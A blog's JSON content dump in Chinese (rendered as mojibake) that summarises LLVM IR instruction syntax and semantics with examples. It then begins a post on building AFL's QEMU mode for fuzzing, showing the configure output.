&lt;new&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;success ordering&gt; &lt;failure ordering&gt;[, align &lt;alignment&gt;] ; yields &#123; ty, i1 &#125; #Example entry: %orig &#x3D; load atomic i32, i32* %ptr unordered, align 4 ; yields i32 br label %loop loop: %cmp &#x3D; phi i32 [ %orig, %entry ], [%value_loaded, %loop] %squared &#x3D; mul i32 %cmp, %cmp %val_success &#x3D; cmpxchg i32* %ptr, i32 %cmp, i32 %squared acq_rel monotonic ; yields &#123; i32, i1 &#125; %value_loaded &#x3D; extractvalue &#123; i32, i1 &#125; %val_success, 0 %success &#x3D; extractvalue &#123; i32, i1 &#125; %val_success, 1 br i1 %success, label %done, label %loop done: ... atomicrmw atomicrmwæŒ‡ä»¤ç”¨äºåŸå­åœ°ä¿®æ”¹å†…å­˜ã€‚ #Syntax: atomicrmw [volatile] &lt;operation&gt; &lt;ty&gt;* &lt;pointer&gt;, &lt;ty&gt; &lt;value&gt; [syncscope(&quot;&lt;target-scope&gt;&quot;)] &lt;ordering&gt;[, align &lt;alignment&gt;] ; yields ty atomicrmwæŒ‡ä»¤æœ‰ä¸‰ä¸ªå‚æ•°ï¼šè¦åº”ç”¨çš„æ“ä½œã€è¦ä¿®æ”¹å…¶å€¼çš„åœ°å€ã€æ“ä½œçš„å‚æ•°ã€‚ xchg: *ptr = val add: *ptr = *ptr + val sub: *ptr = *ptr - val and: *ptr = *ptr &amp; val nand: *ptr = ~(*ptr &amp; val) or: *ptr = *ptr | val xor: *ptr = *ptr ^ val max: *ptr = *ptr &gt; val ? *ptr : val (using a signed comparison) min: *ptr = *ptr &lt; val ? *ptr : val (using a signed comparison) umax: *ptr = *ptr &gt; val ? *ptr : val (using an unsigned comparison) umin: *ptr = *ptr &lt; val ? *ptr : val (using an unsigned comparison) fadd: *ptr = *ptr + val (using floating point arithmetic) fsub: *ptr = *ptr - val (using floating point arithmetic) #Example: %old &#x3D; atomicrmw add i32* %ptr, i32 1 acquire ; yields i32 getelementptr getelementptræŒ‡ä»¤ç”¨äºè·å– aggregate æ•°æ®ç»“æ„çš„å­å…ƒç´ çš„åœ°å€ã€‚ å®ƒåªæ‰§è¡Œåœ°å€è®¡ç®—ï¼Œä¸è®¿é—®å†…å­˜ã€‚ è¯¥æŒ‡ä»¤è¿˜å¯ç”¨äºè®¡ç®—æ­¤ç±»åœ°å€çš„å‘é‡ã€‚ &lt;result&gt; &#x3D; getelementptr &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;* &lt;result&gt; &#x3D; getelementptr inbounds &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;* &lt;result&gt; &#x3D; getelementptr &lt;ty&gt;, &lt;ptr vector&gt; &lt;ptrval&gt;, [inrange] &lt;vector index type&gt; &lt;idx&gt; ç¬¬ä¸€ä¸ª&lt;ty&gt;æ˜¯ç¬¬ä¸€ä¸ªç´¢å¼•&lt;idx&gt;ä½¿ç”¨çš„åŸºæœ¬ç±»å‹ ç¬¬äºŒä¸ª&lt;ty&gt;*è¡¨ç¤ºå…¶åçš„åŸºåœ°å€ptrvalçš„ç±»å‹ã€‚ &lt;ty&gt; &lt;idx&gt;æ˜¯ç¬¬ä¸€ç»„ç´¢å¼•çš„ç±»å‹å’Œå€¼ï¼Œ å¯ä»¥å‡ºç°å¤šæ¬¡ï¼Œå…¶åå‡ºç°å°±æ˜¯ç¬¬äºŒç»„ã€ç¬¬ä¸‰ç»„ç­‰ç­‰ç´¢å¼•çš„ç±»å‹å’Œå€¼ã€‚ #Example: ; yields [12 x i8]*:aptr %aptr &#x3D; getelementptr &#123;i32, [12 x i8]&#125;, &#123;i32, [12 x i8]&#125;* %saptr, i64 0, i32 1 ; yields i8*:vptr %vptr &#x3D; getelementptr &#123;i32, &lt;2 x i8&gt;&#125;, &#123;i32, &lt;2 x i8&gt;&#125;* %svptr, i64 0, i32 1, i32 1 ; yields i8*:eptr %eptr &#x3D; getelementptr [12 x i8], [12 x i8]* %aptr, i64 0, i32 1 ; yields i32*:iptr %iptr &#x3D; getelementptr [10 x i32], [10 x i32]* @arr, i16 0, i16 0 å…¶ä»–æ“ä½œ(Other Operations) icmp æ•´æ•°æ¯”è¾ƒ icmp æŒ‡ä»¤æ ¹æ®å…¶ä¸¤ä¸ªæ•´æ•°ã€æ•´æ•°å‘é‡ã€æŒ‡é’ˆæˆ–æŒ‡é’ˆå‘é‡æ“ä½œæ•°çš„æ¯”è¾ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼æˆ–ä¸€ä¸ªå¸ƒå°”å€¼å‘é‡ã€‚ #Syntax: &lt;result&gt; &#x3D; icmp &lt;cond&gt; &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields i1 or &lt;N x i1&gt;:result Arguments: â€œicmpâ€æŒ‡ä»¤éœ€è¦ä¸‰ä¸ªæ“ä½œæ•°ã€‚ ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºè¦æ‰§è¡Œçš„æ¯”è¾ƒç±»å‹çš„å…³é”®å­—ï¼š eq: equal ne: not equal ugt: unsigned greater than uge: unsigned greater or equal ult: unsigned less than ule: unsigned less or equal sgt: signed greater than sge: signed greater or equal slt: signed less than sle: signed less or equal The remaining two arguments must be integer or pointer or integer vector typed. They must also be identical types. eq: yields true if the operands are equal, false otherwise. No sign interpretation is necessary or performed. ne: yields true if the operands are unequal, false otherwise. No sign interpretation is necessary or performed. ugt: interprets the operands as unsigned values and yields true if op1 is greater than op2. uge: interprets the operands as unsigned values and yields true if op1 is greater than or equal to op2. ult: interprets the operands as unsigned values and yields true if op1 is less than op2. ule: interprets the operands as unsigned values and yields true if op1 is less than or equal to op2. sgt: interprets the operands as signed values and yields true if op1 is greater than op2. sge: interprets the operands as signed values and yields true if op1 is greater than or equal to op2. slt: interprets the operands as signed values and yields true if op1 is less than op2. sle: interprets the operands as signed values and yields true if op1 is less than or equal to op2. #Example &lt;result&gt; &#x3D; icmp eq i32 4, 5 ; yields: result&#x3D;false &lt;result&gt; &#x3D; icmp ne float* %X, %X ; yields: result&#x3D;false &lt;result&gt; &#x3D; icmp ult i16 4, 5 ; yields: result&#x3D;true &lt;result&gt; &#x3D; icmp sgt i16 4, 5 ; yields: result&#x3D;false &lt;result&gt; &#x3D; icmp ule i16 -4, 5 ; yields: result&#x3D;false &lt;result&gt; &#x3D; icmp sge i16 4, 5 ; yields: result&#x3D;false fcmp æµ®ç‚¹æ•°æ¯”è¾ƒ fcmpæŒ‡ä»¤æ ¹æ®å…¶æ“ä½œæ•°çš„æ¯”è¾ƒè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼æˆ–å¸ƒå°”å€¼å‘é‡ã€‚ å¦‚æœæ“ä½œæ•°æ˜¯æµ®ç‚¹æ ‡é‡ï¼Œåˆ™ç»“æœç±»å‹ä¸ºå¸ƒå°”å€¼ (i1)ã€‚ å¦‚æœæ“ä½œæ•°æ˜¯æµ®ç‚¹å‘é‡ï¼Œåˆ™ç»“æœç±»å‹æ˜¯å¸ƒå°”å‘é‡ï¼Œå…¶å…ƒç´ æ•°é‡ä¸è¢«æ¯”è¾ƒçš„æ“ä½œæ•°ç›¸åŒã€‚ #Syntax: &lt;result&gt; &#x3D; fcmp [fast-math flags]* &lt;cond&gt; &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields i1 or &lt;N x i1&gt;:result Arguments: fcmpâ€™æŒ‡ä»¤éœ€è¦ä¸‰ä¸ªæ“ä½œæ•°ã€‚ ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯æŒ‡ç¤ºè¦æ‰§è¡Œçš„æ¯”è¾ƒç±»å‹çš„å…³é”®å­—ï¼š falseï¼šä¸æ¯”è¾ƒï¼Œæ€»æ˜¯è¿”å›false oeqï¼šæœ‰åºä¸”ç›¸ç­‰ ogtï¼šæœ‰åºä¸”å¤§äº ogeï¼šæœ‰åºä¸”å¤§äºç­‰äº oltï¼šæœ‰åºä¸”å°äº oleï¼šæœ‰åºä¸”å°äºæˆ–ç­‰äº oneï¼šæœ‰åºä¸”ä¸ç›¸ç­‰ ordï¼šæœ‰åº(éNASNï¼‰ yields true if both operands are not a QNAN. ueqï¼šæ— åºæˆ–ç›¸ç­‰ ugtï¼šæ— åºæˆ–å¤§äº ugeï¼šæ— åºæˆ–å¤§äºç­‰äº ultï¼šæ— åºæˆ–å°äº uleï¼šæ— åºæˆ–å°äºç­‰äº uneï¼šæ— åºæˆ–ä¸ç›¸ç­‰ unoï¼šæ— åºï¼ˆéƒ½æ˜¯nansï¼‰ yields true if either operand is a QNAN. trueï¼šä¸æ¯”è¾ƒï¼Œæ€»æ˜¯è¿”å›true Ordered è¡¨ç¤ºä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸æ˜¯ QNANï¼Œè€Œ unordered è¡¨ç¤ºä»»ä½•ä¸€ä¸ªæ“ä½œæ•°éƒ½å¯èƒ½æ˜¯ QNANã€‚ æ¯ä¸ª val1 å’Œ val2 å‚æ•°å¿…é¡»æ˜¯ floating-point ç±»å‹æˆ– [vector](https://llvm .org/docs/LangRef.html#t-vector) çš„æµ®ç‚¹ç±»å‹ã€‚ å®ƒä»¬å¿…é¡»å…·æœ‰ç›¸åŒçš„ç±»å‹ã€‚ Semantics: The â€˜fcmpâ€™ instruction compares op1 and op2 according to the condition code given as cond. If the operands are vectors, then the vectors are compared element by element. Each comparison performed always yields an i1 result, as follows: false: always yields false, regardless of operands. oeq: yields true if both operands are not a QNAN and op1 is equal to op2. ogt: yields true if both operands are not a QNAN and op1 is greater than op2. oge: yields true if both operands are not a QNAN and op1 is greater than or equal to op2. olt: yields true if both operands are not a QNAN and op1 is less than op2. ole: yields true if both operands are not a QNAN and op1 is less than or equal to op2. one: yields true if both operands are not a QNAN and op1 is not equal to op2. ord: yields true if both operands are not a QNAN. ueq: yields true if either operand is a QNAN or op1 is equal to op2. ugt: yields true if either operand is a QNAN or op1 is greater than op2. uge: yields true if either operand is a QNAN or op1 is greater than or equal to op2. ult: yields true if either operand is a QNAN or op1 is less than op2. ule: yields true if either operand is a QNAN or op1 is less than or equal to op2. une: yields true if either operand is a QNAN or op1 is not equal to op2. uno: yields true if either operand is a QNAN. true: always yields true, regardless of operands. fcmp æŒ‡ä»¤è¿˜å¯ä»¥é€‰æ‹©é‡‡ç”¨ä»»æ„æ•°é‡çš„ fast-math æ ‡å¿—ï¼Œå®ƒä»¬æ˜¯å¯ç”¨å…¶ä»–ä¸å®‰å…¨æµ®ç‚¹ä¼˜åŒ–çš„ä¼˜åŒ–æç¤ºã€‚ ä»»ä½•ä¸€ç»„å¿«é€Ÿæ•°å­¦æ ‡å¿—åœ¨â€œfcmpâ€æŒ‡ä»¤ä¸Šéƒ½æ˜¯åˆæ³•çš„ï¼Œä½†å”¯ä¸€å¯¹å…¶è¯­ä¹‰æœ‰ä»»ä½•å½±å“çš„æ ‡å¿—æ˜¯é‚£äº›å…è®¸å¯¹è¾“å…¥å‚æ•°çš„å€¼è¿›è¡Œå‡è®¾çš„æ ‡å¿—ï¼› å³nnanã€ninfå’Œreassocã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Fast-Math æ ‡å¿—ã€‚ # Example: &lt;result&gt; &#x3D; fcmp oeq float 4.0, 5.0 ; yields: result&#x3D;false &lt;result&gt; &#x3D; fcmp one float 4.0, 5.0 ; yields: result&#x3D;true &lt;result&gt; &#x3D; fcmp olt float 4.0, 5.0 ; yields: result&#x3D;true &lt;result&gt; &#x3D; fcmp ueq double 1.0, 2.0 ; yields: result&#x3D;false phi phi æŒ‡ä»¤ç”¨äºå®ç° SSA å›¾ä¸­è¡¨ç¤ºå‡½æ•°çš„ Ï† èŠ‚ç‚¹ã€‚ åœ¨è¿è¡Œæ—¶ï¼ŒphiæŒ‡ä»¤åœ¨é€»è¾‘ä¸Šé‡‡ç”¨ä¸åœ¨å½“å‰å—ä¹‹å‰æ‰§è¡Œçš„å‰é©±åŸºæœ¬å—ç›¸å¯¹åº”çš„å¯¹æŒ‡å®šçš„å€¼ã€‚ # Syntax: &lt;result&gt; &#x3D; phi [fast-math-flags] &lt;ty&gt; [ &lt;val0&gt;, &lt;label0&gt;], ... Arguments: ä¼ å…¥å€¼çš„ç±»å‹ç”±ç¬¬ä¸€ä¸ªç±»å‹å­—æ®µæŒ‡å®šã€‚ åœ¨æ­¤ä¹‹åï¼ŒphiæŒ‡ä»¤å°†ä¸€å¯¹åˆ—è¡¨ä½œä¸ºå‚æ•°ï¼Œå…¶ä¸­ä¸€å¯¹ç”¨äºå½“å‰å—çš„æ¯ä¸ªå‰é©±åŸºæœ¬å—ã€‚ åªæœ‰ first class ç±»å‹çš„å€¼å¯ä»¥ç”¨ä½œ PHI èŠ‚ç‚¹çš„å€¼å‚æ•°ã€‚ åªæœ‰æ ‡ç­¾å¯ä»¥ç”¨ä½œæ ‡ç­¾å‚æ•°ã€‚ åœ¨åŸºæœ¬å—çš„å¼€å§‹å’Œ PHI æŒ‡ä»¤ä¹‹é—´ä¸èƒ½æœ‰é phi æŒ‡ä»¤ï¼šå³ PHI æŒ‡ä»¤å¿…é¡»åœ¨åŸºæœ¬å—ä¸­çš„ç¬¬ä¸€ä¸ªã€‚ å°± SSA å½¢å¼è€Œè¨€ï¼Œæ¯ä¸ªä¼ å…¥å€¼çš„ä½¿ç”¨éƒ½è¢«è®¤ä¸ºå‘ç”Ÿåœ¨ä»ç›¸åº”çš„å‰é©±å—åˆ°å½“å‰å—çš„è¾¹ä¸Šï¼ˆä½†åœ¨åŒä¸€è¾¹ä¸Šå®šä¹‰äº†â€œinvokeâ€æŒ‡ä»¤çš„è¿”å›å€¼ä¹‹åã€‚ # Example: Loop: ; Infinite loop that counts from 0 on up... %indvar &#x3D; phi i32 [ 0, %LoopHeader ], [ %nextindvar, %Loop ] %nextindvar &#x3D; add i32 %indvar, 1 br label %Loop select æ¡ä»¶å€¼é€‰æ‹© selectæŒ‡ä»¤ç”¨äºæ ¹æ®æ¡ä»¶é€‰æ‹©ä¸€ä¸ªå€¼ï¼Œæ— éœ€ IR çº§åˆ†æ”¯ã€‚ å¦‚æœæ¡ä»¶æ˜¯ i1 å¹¶ä¸”è®¡ç®—ç»“æœä¸º 1ï¼Œåˆ™æŒ‡ä»¤è¿”å›ç¬¬ä¸€ä¸ªå€¼å‚æ•°ï¼› å¦åˆ™ï¼Œå®ƒè¿”å›ç¬¬äºŒä¸ªå€¼å‚æ•°ã€‚ å¦‚æœæ¡ä»¶æ˜¯ i1 çš„å‘é‡ï¼Œåˆ™å€¼å‚æ•°å¿…é¡»æ˜¯ç›¸åŒå¤§å°çš„å‘é‡ï¼Œå¹¶ä¸”é€‰æ‹©æ˜¯é€ä¸ªå…ƒç´ å®Œæˆçš„ã€‚ å¦‚æœæ¡ä»¶æ˜¯ i1 å¹¶ä¸”å€¼å‚æ•°æ˜¯ç›¸åŒå¤§å°çš„å‘é‡ï¼Œåˆ™é€‰æ‹©æ•´ä¸ªå‘é‡ã€‚ #Syntax &lt;result&gt; &#x3D; select [fast-math flags] selty &lt;cond&gt;, &lt;ty&gt; &lt;val1&gt;, &lt;ty&gt; &lt;val2&gt; ; yields ty selty is either i1 or &#123;&lt;N x i1&gt;&#125; #Example: %X &#x3D; select i1 true, i8 17, i8 42 ; yields i8:17 freeze freeze æŒ‡ä»¤ç”¨äºåœæ­¢ undef å’Œ [poison](https://llvm.org/docs/LangRef. html#poisonvalues) å€¼ã€‚ #Syntax: &lt;result&gt; &#x3D; freeze ty &lt;val&gt; ; yields ty:result Semantics: å¦‚æœå‚æ•°æ˜¯ undef æˆ– poisonï¼Œåˆ™ freezeâ€™è¿”å›ä¸€ä¸ªä»»æ„ä½†å›ºå®šçš„ç±»å‹ä¸º ``ty' çš„å€¼ã€‚ å¦åˆ™ï¼Œæ­¤æŒ‡ä»¤ä¸ºç©ºæ“ä½œå¹¶è¿”å›è¾“å…¥å‚æ•°ã€‚ åŒä¸€æ¡freezeæŒ‡ä»¤è¿”å›çš„å€¼çš„æ‰€æœ‰ä½¿ç”¨éƒ½ä¿è¯å§‹ç»ˆéµå®ˆç›¸åŒçš„å€¼ï¼Œè€Œä¸åŒçš„freeze`æŒ‡ä»¤å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„å€¼ã€‚ è™½ç„¶ undef å’Œ poison æŒ‡é’ˆå¯ä»¥è¢«å†»ç»“ï¼Œä½†ç»“æœæ˜¯ä¸€ä¸ªä¸å¯è§£å¼•ç”¨çš„æŒ‡é’ˆã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… æŒ‡é’ˆåˆ«åè§„åˆ™ éƒ¨åˆ†ã€‚ å¦‚æœèšåˆå€¼æˆ–å‘é‡è¢«å†»ç»“ï¼Œåˆ™æ“ä½œæ•°æŒ‰å…ƒç´ å†»ç»“ã€‚ ä¸è€ƒè™‘èšåˆçš„å¡«å……ï¼Œå› ä¸ºå¦‚æœä¸å°†å…¶å­˜å‚¨åˆ°å†…å­˜ä¸­å¹¶ä»¥ä¸åŒçš„ç±»å‹åŠ è½½å®ƒï¼Œå®ƒæ˜¯ä¸å¯è§çš„ã€‚ # Example: %w &#x3D; i32 undef %x &#x3D; freeze i32 %w %y &#x3D; add i32 %w, %w ; undef %z &#x3D; add i32 %x, %x ; even number because all uses of %x observe ; the same value %x2 &#x3D; freeze i32 %w %cmp &#x3D; icmp eq i32 %x, %x2 ; can be true or false ; example with vectors %v &#x3D; &lt;2 x i32&gt; &lt;i32 undef, i32 poison&gt; %a &#x3D; extractelement &lt;2 x i32&gt; %v, i32 0 ; undef %b &#x3D; extractelement &lt;2 x i32&gt; %v, i32 1 ; poison %add &#x3D; add i32 %a, %a ; undef %v.fr &#x3D; freeze &lt;2 x i32&gt; %v ; element-wise freeze %d &#x3D; extractelement &lt;2 x i32&gt; %v.fr, i32 0 ; not undef %add.f &#x3D; add i32 %d, %d ; even number ; branching on frozen value %poison &#x3D; add nsw i1 %k, undef ; poison %c &#x3D; freeze i1 %poison br i1 %c, label %foo, label %bar ; non-deterministic branch to %foo or %bar call ç®€å•å‡½æ•°è°ƒç”¨ callæŒ‡ä»¤ä»£è¡¨ä¸€ä¸ªç®€å•çš„å‡½æ•°è°ƒç”¨ã€‚ # Syntax: &lt;result&gt; &#x3D; [tail | musttail | notail ] call [fast-math flags] [cconv] [ret attrs] [addrspace(&lt;num&gt;)] &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs] [ operand bundles ] Arguments: https://llvm.org/docs/LangRef.html#id2116 Semantics: callæŒ‡ä»¤ç”¨äºä½¿æ§åˆ¶æµè½¬ç§»åˆ°æŒ‡å®šå‡½æ•°ï¼Œå…¶ä¼ å…¥å‚æ•°ç»‘å®šåˆ°æŒ‡å®šå€¼ã€‚ åœ¨è¢«è°ƒç”¨å‡½æ•°ä¸­æ‰§è¡ŒretæŒ‡ä»¤æ—¶ï¼Œæ§åˆ¶æµç»§ç»­æ‰§è¡Œå‡½æ•°è°ƒç”¨ä¹‹åçš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å‡½æ•°çš„è¿”å›å€¼ç»‘å®šåˆ°ç»“æœå‚æ•°ã€‚ # Example: %retval &#x3D; call i32 @test(i32 %argc) call i32 (i8*, ...)* @printf(i8* %msg, i32 12, i8 42) ; yields i32 %X &#x3D; tail call i32 @foo() ; yields i32 %Y &#x3D; tail call fastcc i32 @foo() ; yields i32 call void %foo(i8 signext 97) %struct.A &#x3D; type &#123; i32, i8 &#125; %r &#x3D; call %struct.A @foo() ; yields &#123; i32, i8 &#125; %gr &#x3D; extractvalue %struct.A %r, 0 ; yields i32 %gr1 &#x3D; extractvalue %struct.A %r, 1 ; yields i8 %Z &#x3D; call void @foo() noreturn ; indicates that %foo never returns normally %ZZ &#x3D; call zeroext i32 @bar() ; Return value is %zero extended va_arg å¯å˜å‚æ•° va_argæŒ‡ä»¤ç”¨äºè®¿é—®é€šè¿‡å‡½æ•°è°ƒç”¨çš„variable argumenåŒºåŸŸä¼ é€’çš„å‚æ•°ã€‚ å®ƒç”¨äºåœ¨ C ä¸­å®ç° va_arg å®ã€‚ # Syntax: &lt;resultval&gt; &#x3D; va_arg &lt;va_list*&gt; &lt;arglist&gt;, &lt;argty&gt; Example: See the variable argument processing section. landingpad LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ ä½¿ç”¨landingpadæŒ‡ä»¤æ¥æŒ‡å®šä¸€ä¸ªåŸºæœ¬å—æ˜¯ä¸€ä¸ªç€é™†åœºâ€”â€”ä¸€ä¸ªå¼‚å¸¸ç€é™†çš„åœ°æ–¹ï¼Œ å¹¶ä¸”å¯¹åº”äºåœ¨ try/catch åºåˆ—çš„ catch éƒ¨åˆ†ä¸­æ‰¾åˆ°çš„ä»£ç ã€‚ å®ƒå®šä¹‰äº† personality å‡½æ•° åœ¨é‡æ–°è¿›å…¥è¯¥å‡½æ•°æ—¶æä¾›çš„å€¼ã€‚ resultval çš„ç±»å‹ä¸º resulttyã€‚ # Syntax: &lt;resultval&gt; &#x3D; landingpad &lt;resultty&gt; &lt;clause&gt;+ &lt;resultval&gt; &#x3D; landingpad &lt;resultty&gt; cleanup &lt;clause&gt;* &lt;clause&gt; :&#x3D; catch &lt;type&gt; &lt;value&gt; &lt;clause&gt; :&#x3D; filter &lt;array constant type&gt; &lt;array constant&gt; # Example: ;; A landing pad which can catch an integer. %res &#x3D; landingpad &#123; i8*, i32 &#125; catch i8** @_ZTIi ;; A landing pad that is a cleanup. %res &#x3D; landingpad &#123; i8*, i32 &#125; cleanup ;; A landing pad which can catch an integer and can only throw a double. %res &#x3D; landingpad &#123; i8*, i32 &#125; catch i8** @_ZTIi filter [1 x i8**] [i8** @_ZTId] catchpad LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ ä½¿ç”¨catchpadæŒ‡ä»¤æ¥æŒ‡å®šä¸€ä¸ªåŸºæœ¬å—å¼€å§‹ä¸€ä¸ª catch å¤„ç†ç¨‹åº- ä¸ªæ€§ä¾‹ç¨‹è¯•å›¾è½¬ç§»æ§åˆ¶ä»¥æ•è·å¼‚å¸¸çš„ä¸€ç§ã€‚ #Syntax: &lt;resultval&gt; &#x3D; catchpad within &lt;catchswitch&gt; [&lt;args&gt;*] #Example: dispatch: %cs &#x3D; catchswitch within none [label %handler0] unwind to caller ;; A catch block which can catch an integer. handler0: %tok &#x3D; catchpad within %cs [i8** @_ZTIi] cleanuppad LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿä½¿ç”¨cleanuppadæŒ‡ä»¤æ¥æŒ‡å®šåŸºæœ¬å—æ˜¯æ¸…ç†å—- ä¸ªæ€§ä¾‹ç¨‹è¯•å›¾è½¬ç§»æ§åˆ¶ä»¥è¿è¡Œæ¸…ç†æ“ä½œçš„ä¸€ç§ã€‚ # Syntax: &lt;resultval&gt; &#x3D; cleanuppad within &lt;parent&gt; [&lt;args&gt;*] # Example: %tok &#x3D; cleanuppad within %cs [] Poison Values A poison value é”™è¯¯æ“ä½œçš„ç»“æœã€‚. ä¸ºäº†ä¿ƒè¿›æ¨æµ‹æ‰§è¡Œï¼Œè®¸å¤šæŒ‡ä»¤åœ¨æä¾›éæ³•æ“ä½œæ•°æ—¶ä¸ä¼šç«‹å³è°ƒç”¨æœªå®šä¹‰è¡Œä¸ºï¼Œè€Œæ˜¯è¿”å›poison value ã€‚ å­—ç¬¦ä¸² poison å¯ä»¥åœ¨ä»»ä½•éœ€è¦å¸¸é‡çš„åœ°æ–¹ä½¿ç”¨ï¼Œå¹¶ä¸”å¸¦æœ‰ nsw æ ‡å¿—çš„ add ç­‰æ“ä½œå¯ä»¥äº§ç”Ÿpoison valueã€‚ Most instructions return â€˜poisonâ€™ when one of their arguments is â€˜poisonâ€™. A notable exception is the select instruction. Propagation of poison can be stopped with the freeze instruction. It is correct to replace a poison value with an undef value or any value of the type. This means that immediate undefined behavior occurs if a poison value is used as an instruction operand that has any values that trigger undefined behavior. Notably this includes (but is not limited to): The pointer operand of a load, store or any other pointer dereferencing instruction (independent of address space). The divisor operand of a udiv, sdiv, urem or srem instruction. The condition operand of a br instruction. The callee operand of a call or invoke instruction. The parameter operand of a call or invoke instruction, when the function or invoking call site has a noundef attribute in the corresponding position. The operand of a ret instruction if the function or invoking call site has a noundef attribute in the return value position. Here are some examples: entry: %poison &#x3D; sub nuw i32 0, 1 ; Results in a poison value. %poison2 &#x3D; sub i32 poison, 1 ; Also results in a poison value. %still_poison &#x3D; and i32 %poison, 0 ; 0, but also poison. %poison_yet_again &#x3D; getelementptr i32, i32* @h, i32 %still_poison store i32 0, i32* %poison_yet_again ; Undefined behavior due to ; store to poison. store i32 %poison, i32* @g ; Poison value stored to memory. %poison3 &#x3D; load i32, i32* @g ; Poison value loaded back from memory. %narrowaddr &#x3D; bitcast i32* @g to i16* %wideaddr &#x3D; bitcast i32* @g to i64* %poison4 &#x3D; load i16, i16* %narrowaddr ; Returns a poison value. %poison5 &#x3D; load i64, i64* %wideaddr ; Returns a poison value. %cmp &#x3D; icmp slt i32 %poison, 0 ; Returns a poison value. br i1 %cmp, label %end, label %end ; undefined behavior end:","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"AFL(american Fuzzy Lop)å­¦ä¹ ä¸€-è¡¥å……QEMUæ¨¡å¼","slug":"AFLå­¦ä¹ -ä¸€QEMUæ¨¡å¼","date":"2022-04-10T07:47:00.000Z","updated":"2022-04-19T02:43:24.326Z","comments":true,"path":"posts/4bf8181c/","link":"","permalink":"https://www.sizaif.com/posts/4bf8181c/","excerpt":"","text":"QEMUæ¨¡å¼æµ‹è¯• @2022-04-10 @sizaif ç¼–è¯‘QEMU å‚è€ƒREADME.qemu $./build_qemu_support.sh # Cannot use 'python', Python 2.6 or later is required.Note that Python 3 or later is not yet supported. # å®‰è£…ä¾èµ–ï¼Œå°†pythoné“¾æ¥åˆ°python2ä¸Š $ sudo apt-get install libtool,libtool-bin,bison,libgtk2.0-dev,python2 ================================================= AFL binary-only instrumentation QEMU build script ================================================= [*] Performing basic sanity checks... [+] All checks passed! [+] Cryptographic signature on qemu-2.10.0.tar.xz checks out. [*] Uncompressing archive (this will take a while)... [+] Unpacking successful. [*] Configuring QEMU for ... [*] Applying patches... patching file linux-user/elfload.c patching file accel/tcg/cpu-exec.c patching file linux-user/syscall.c patching file configure patching file util/memfd.c [+] Patching done. Install prefix /usr/local BIOS directory /usr/local/share/qemu binary directory /usr/local/bin library directory /usr/local/lib module directory /usr/local/lib/qemu libexec directory /usr/local/libexec include directory /usr/local/include config directory /usr/local/etc local state directory /usr/local/var Manual directory /usr/local/share/man ELF interp prefix /usr/gnemul/qemu-%M Source path /home/workhome/AFL/qemu_mode/qemu-2.10.0 C compiler cc Host C compiler cc C++ compiler c++ Objective-C compiler cc ARFLAGS rv CFLAGS -O2 -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=2 -g -O3 -ggdb QEMU_CFLAGS -I/usr/include/pixman-1 -I$(SRC_PATH)/dtc/libfdt -pthread -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -fPIE -DPIE -m64 -mcx16 -D_GNU_SOURCE -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -Wstrict-prototypes -Wredundant-decls -Wall -Wundef -Wwrite-strings -Wmissing-prototypes -fno-strict-aliasing -fno-common -fwrapv -Wexpansion-to-defined -Wendif-labels -Wno-shift-negative-value -Wno-missing-include-dirs -Wempty-body -Wnested-externs -Wformat-security -Wformat-y2k -Winit-self -Wignored-qualifiers -Wold-style-declaration -Wold-style-definition -Wtype-limits -fstack-protector-strong LDFLAGS -Wl,--warn-common -Wl,-z,relro -Wl,-z,now -pie -m64 -g make make install install python python -B smbd /usr/sbin/smbd module support no host CPU x86_64 host big endian no target list x86_64-linux-user gprof enabled no sparse enabled no strip binaries yes profiler no static build no pixman system SDL support no GTK support no GTK GL support no VTE support no TLS priority NORMAL GNUTLS support no GNUTLS rnd no libgcrypt no libgcrypt kdf no nettle no nettle kdf no libtasn1 no curses support no virgl support no curl support no mingw32 support no Audio drivers oss Block whitelist (rw) Block whitelist (ro) VirtFS support VNC support no xen support no brlapi support no bluez support no Documentation no PIE yes vde support no netmap support no Linux AIO support no ATTR/XATTR support yes Install blobs yes KVM support yes HAX support no TCG support yes TCG debug enabled no TCG interpreter no RDMA support no fdt support yes preadv support yes fdatasync yes madvise yes posix_madvise yes libcap-ng support no vhost-net support yes vhost-scsi support yes vhost-vsock support yes vhost-user support yes Trace backends log spice support no rbd support no xfsctl support no smartcard support no libusb no usb net redir no OpenGL support no OpenGL dmabufs no libiscsi support no libnfs support no build guest agent yes QGA VSS support no QGA w32 disk info no QGA MSI support no seccomp support no coroutine backend ucontext coroutine pool yes debug stack usage no crypto afalg no GlusterFS support no gcov gcov gcov enabled no TPM support yes libssh2 support no TPM passthrough yes QOM debugging yes Live block migration yes lzo support no snappy support no bzip2 support no NUMA host support no tcmalloc support no jemalloc support no 